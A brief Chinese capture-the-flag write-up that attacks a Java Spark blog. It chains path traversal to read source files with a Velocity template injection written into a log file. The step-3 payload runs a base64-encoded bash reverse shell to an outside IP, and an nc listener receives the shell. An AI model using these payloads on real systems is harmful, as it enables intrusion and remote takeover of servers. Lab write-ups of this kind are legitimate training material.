#### 查看文章，发现提示
I wrote my blog with Spark.
说明题目使用了Java Spark框架

#### 利用文件读取漏洞读取pom.xml以及源码
1. 读取pom.xml: /?title=../../../../pom.xml
发现启动class为Blog
2. 读取Blog.java: /?title=../../../../src/main/java/Blog.java
发现使用了Velocity模板引擎，另外程序会将用户传进来的title参数存到日志文件中，想到可以用Velocity模板getshell
3. 构造payload写入日志文件，这里的命令需要换成自己的反弹的vps地址
/?title=%23set+(%24exp+%3d+%22exp%22)%24exp.getClass().forName(%22java.lang.Runtime%22).getRuntime().exec(%22bash+-c+%7becho%2cL2Jpbi9iYXNoICAtaSA%2bIC9kZXYvdGNwLzExMS4yMjkuMjExLjcxLzc3NzcgMDwmMSAyPiYx%7d%7c%7bbase64%2c-d%7d%7c%7bbash%2c-i%7d%22)
4. 包含日志文件getshell
a) 在远程机器监听，例如nc -lvn 7777
b) 从cookie中取出自己的session id（例如node0wb1gn0xxbr541crs7vtwbldn00），然后包含指定的日志文件即可getshell
/?title=../../../../../../../tmp/node0wb1gn0xxbr541crs7vtwbldn00
c) 在/tmp目录下读取到flag